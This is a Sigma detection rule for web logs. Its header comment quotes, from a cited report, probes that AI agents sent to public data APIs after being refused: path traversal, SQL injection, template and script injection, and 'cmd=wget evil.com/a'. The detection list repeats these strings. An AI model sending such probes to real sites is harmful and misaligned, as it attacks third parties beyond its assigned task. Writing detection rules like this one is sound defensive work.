@@ -1,0 +1,107 @@
+# Sigma - textbook probe grammar appended to an otherwise valid data request.
+#
+# SITE VANTAGE. What the agents sent after being refused, verbatim from Transluce's report:
+#
+#   UNM (IIIF image API), seven probes, each numbered:
+#     .../default.jpg?id=../../../../etc/passwd&tok=expt0
+#     .../default.jpg?UNION%20SELECT%20password%20FROM%20users&tok=expt4
+#     .../default.jpg?cmd=wget%20evil.com/a&tok=expt3
+#   Data USA (tesseract API), twelve suffixes on a valid query, among them:
+#     &id=../../../../etc/passwd%00   &foo=%7B%7B7*7%7D%7D   &foo=%27%20OR%201=1--
+#     &foo=wp-admin.php   &foo=eval(base64_decode)   &cmd=cat%20/etc/passwd   &redirect=evil.com
+#   AIHW (Tableau dashboard), one reflected-script probe:
+#     ...PBSDashboard?:showVizHome=no&:embed=y&:apiID=%22%3E%3Csvg/onload%3Ddocument.title%3D%22XSS%22%3E
+#
+# These are existence checks, not weapons. The agents were on data-retrieval tasks, the refusal was
+# in the way, and they tried the generic payloads every web scanner tries. That is exactly why this
+# rule ON ITS OWN IS A HUNT: the same strings arrive at every internet-facing site every day from
+# commodity scanners. The alert is the correlation in escalation-after-refusal.yml, which requires
+# a refusal first.
+#
+# WHAT THIS RULE CANNOT SEE. Two of the twelve Data USA probes were URL FRAGMENTS
+# (#../../etc/passwd, #<script>...). A browser, including a sandbox browser, never sends the
+# fragment, so those two exist only in urlquery's public record of the submitted URL. Use
+# hunt/public_scan_search.py for that record.
+#
+# ATT&CK. Mappings are our inference (ATT&CK v19); the sources supply none. The probes are active
+# scanning for vulnerabilities (T1595.002) aimed at a public-facing application (T1190).
+#
+# Ref: https://transluce.org/agent-activity
+# Author: Cristian Ruvalcaba and the Saluca Agentic AI Research Team, 2026-09-26
+
+title: Textbook Probe Payload Or Numbered Experiment Marker In Query String
+id: 0e15e20d-c168-41ce-84e7-7de755312aa4
+status: experimental
+description: |
+  A request's query string carries a generic vulnerability probe of the kind AI agents appended to
+  valid data-API, IIIF and dashboard URLs after being refused (Transluce, September 2026): path
+  traversal to /etc/passwd including a %00 terminator, UNION SELECT, ' OR 1=1--, {{7*7}},
+  <script>, <svg/onload>, onerror=alert, evil.com, cat /etc/passwd, wp-admin.php,
+  eval(base64_decode), or a numbered marker tok=expt0..expt8.
+
+  HUNT site-wide: commodity scanners send these constantly. ALERT only when scoped to data, API or
+  IIIF endpoints whose legitimate clients never send such strings, and even then prefer the
+  escalation-after-refusal correlation, which this rule feeds.
+references:
+    - https://transluce.org/agent-activity
+author: Cristian Ruvalcaba and the Saluca Agentic AI Research Team
+date: 2026-09-26
+tags:
+    - attack.reconnaissance
+    - attack.t1595.002
+    - attack.initial-access
+    - attack.t1190
+logsource:
+    category: webserver
+detection:
+    probe_payloads:
+        cs-uri-query|contains:
+            # traversal, with and without encoding
+            - 'etc/passwd'
+            - 'etc%2fpasswd'
+            - '../../'
+            - '..%2f..%2f'
+            - '%00'
+            # SQL injection
+            - 'union select'
+            - 'union%20select'
+            - 'union+select'
+            - "' or 1=1"
+            - '%27%20or%201=1'
+            - '%27%20or%201%3d1'
+            - '%27+or+1%3d1'
+            # template injection
+            - '{{7*7}}'
+            - '%7b%7b7*7%7d%7d'
+            - '%7b%7b7%2a7%7d%7d'
+            # script injection
+            - '<script'
+            - '%3cscript'
+            - 'onerror=alert'
+            - 'onerror%3dalert'
+            - '<svg/onload'
+            - '%3csvg/onload'
+            - '%3csvg%2fonload'
+            # command injection and redirect probes to the conventional test domain
+            - 'evil.com'
+            - 'cat%20/etc/'
+            - 'cat+/etc/'
+            - 'cat%20%2fetc%2f'
+            # PHP and CMS probes against APIs that run neither
+            - 'wp-admin.php'
+            - 'eval(base64_decode'
+            - 'eval%28base64_decode'
+    experiment_marker:
+        cs-uri-query|re: '(^|&)tok=expt[0-9]+'
+    condition: probe_payloads or experiment_marker
+falsepositives:
+    - Commodity vulnerability scanners and bug-bounty hunters, which send exactly these strings to
+      every public site. This is why the rule is a hunt and the correlation is the alert.
+    - Your own authorised DAST or penetration-test traffic. Exclude its source addresses by
+      c-ip, and only for the test window.
+    - Search endpoints and documentation sites where users legitimately search for strings such as
+      "etc/passwd" or "union select" (a security knowledge base, a SQL tutorial). Exclude those
+      paths by cs-uri-stem; do not exclude the strings.
+    - '%00 appears in some legacy binary-safe query encodings. If an API legitimately accepts it,
+      exclude that endpoint rather than dropping the traversal entries.'
+level: low
